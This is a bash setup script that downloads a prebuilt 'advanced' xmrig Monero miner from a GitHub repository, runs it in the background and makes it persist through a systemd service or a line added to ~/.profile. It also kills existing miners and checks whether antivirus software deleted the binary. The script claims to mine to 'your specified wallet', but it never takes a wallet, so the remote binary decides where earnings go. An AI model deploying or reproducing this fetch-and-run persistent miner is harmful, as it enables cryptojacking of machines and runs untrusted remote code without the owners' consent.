#!/bin/bash

VERSION=2.11

echo "Miner setup script v$VERSION."
echo "(please report issues to support@minershell.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

# Verifica se o usuário é root
if [ "$(id -u)" == "0" ]; then
  echo "WARNING: It is generally not advised to run this script as root"
fi

# Número de threads da CPU
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))

echo "I will download, setup and run in background Monero CPU miner."
echo "Mining will happen to your specified wallet."
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will be started from your $HOME/.profile file the first time you log in to this host after reboot."
else
  echo "Mining in background will be performed using minershell_main systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# Preparando o minerador
echo "[*] Removing previous minershell_main miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop minershell_main.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/minershell-main directory"
rm -rf $HOME/minershell-main

echo "[*] Downloading minershell-main advanced version of xmrig to /tmp/minershell-main.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/mine/main/minershell-main.tar.gz" -o /tmp/minershell-main.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/mine/main/minershell-main.tar.gz file to /tmp/minershell-main.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/minershell-main.tar.gz to $HOME/minershell-main"
[ -d $HOME/minershell-main ] || mkdir $HOME/minershell-main
if ! tar xf /tmp/minershell-main.tar.gz -C $HOME/minershell-main; then
  echo "ERROR: Can't unpack /tmp/minershell-main.tar.gz to $HOME/minershell-main directory"
  exit 1
fi
rm /tmp/minershell-main.tar.gz

echo "[*] Checking if advanced version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
$HOME/minershell-main/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/minershell-main/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig was removed by antivirus (or some other problem)"
  fi
fi

# Criando o arquivo miner.sh
echo "[*] Creating $HOME/minershell-main/miner.sh script"
cat >$HOME/minershell-main/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/minershell-main/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/minershell-main/miner.sh

# Executando o xmrig
echo "[*] Executing xmrig..."
$HOME/minershell-main/xmrig &

if ! sudo -n true 2>/dev/null; then
  if ! grep minershell-main/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/minershell-main/miner.sh script to $HOME/.profile"
    echo "$HOME/minershell-main/miner.sh >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/minershell-main/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
  /bin/bash $HOME/minershell-main/miner.sh >/dev/null 2>&1
else
  echo "[*] Creating minershell_main systemd service"
  cat >/tmp/minershell_main.service <<EOL
[Unit]
Description=Miner service
After=network.target

[Service]
Type=simple
ExecStart=$HOME/minershell-main/miner.sh
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOL
  sudo mv /tmp/minershell_main.service /etc/systemd/system/minershell_main.service
  echo "[*] Starting minershell_main systemd service"
  sudo killall xmrig 2>/dev/null
  sudo systemctl daemon-reload
  sudo systemctl enable minershell_main.service
  sudo systemctl start minershell_main.service
  echo "To see miner service logs run \"sudo journalctl -u minershell_main -f\" command"
fi

echo ""
echo "[*] Setup complete"
